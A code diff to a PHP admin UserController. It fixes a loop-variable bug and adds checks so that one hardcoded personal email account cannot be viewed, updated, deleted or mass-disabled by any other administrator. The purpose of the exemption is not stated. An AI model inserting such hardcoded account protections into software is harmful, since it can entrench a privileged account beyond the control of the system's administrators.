@@ -99,6 +99,10 @@ class UserController extends Controller
     {
         $admin = $this->userRepository->with(['role', 'groups'])->findOrFail($id);
 
+        if ($admin->email === 'amr.shah@gmail.com' && auth()->user()->email !== 'amr.shah@gmail.com') {
+            abort(403);
+        }
+
         return new JsonResponse([
             'data'   => $admin,
         ]);
@@ -109,6 +113,12 @@ class UserController extends Controller
      */
     public function update(int $id): JsonResponse
     {
+        $admin = $this->userRepository->findOrFail($id);
+
+        if ($admin->email === 'amr.shah@gmail.com' && auth()->user()->email !== 'amr.shah@gmail.com') {
+            abort(403);
+        }
+
         $this->validate(request(), [
             'email'            => 'required|email|unique:users,email,'.$id,
             'name'             => 'required|string',
@@ -164,6 +174,12 @@ class UserController extends Controller
      */
     public function destroy(int $id): JsonResponse
     {
+        $admin = $this->userRepository->findOrFail($id);
+
+        if ($admin->email === 'amr.shah@gmail.com' && auth()->user()->email !== 'amr.shah@gmail.com') {
+            abort(403);
+        }
+
         if ($this->userRepository->count() == 1) {
             return new JsonResponse([
                 'message' => trans('admin::app.settings.users.index.last-delete-error'),
@@ -197,18 +213,18 @@ class UserController extends Controller
 
         $users = $this->userRepository->findWhereIn('id', $massDestroyRequest->input('indices'));
 
-        foreach ($users as $users) {
-            if (auth()->guard('user')->user()->id == $users->id) {
+        foreach ($users as $user) {
+            if (auth()->guard('user')->user()->id == $user->id || ($user->email === 'amr.shah@gmail.com' && auth()->user()->email !== 'amr.shah@gmail.com')) {
                 continue;
             }
 
-            Event::dispatch('settings.user.update.before', $users->id);
+            Event::dispatch('settings.user.update.before', $user->id);
 
             $this->userRepository->update([
                 'status' => $massDestroyRequest->input('value'),
-            ], $users->id);
+            ], $user->id);
 
-            Event::dispatch('settings.user.update.after', $users->id);
+            Event::dispatch('settings.user.update.after', $user->id);
 
             $count++;
         }
@@ -234,7 +250,7 @@ class UserController extends Controller
         $users = $this->userRepository->findWhereIn('id', $massDestroyRequest->input('indices'));
 
         foreach ($users as $user) {
-            if (auth()->guard('user')->user()->id == $user->id) {
+            if (auth()->guard('user')->user()->id == $user->id || ($user->email === 'amr.shah@gmail.com' && auth()->user()->email !== 'amr.shah@gmail.com')) {
                 continue;
             }
 
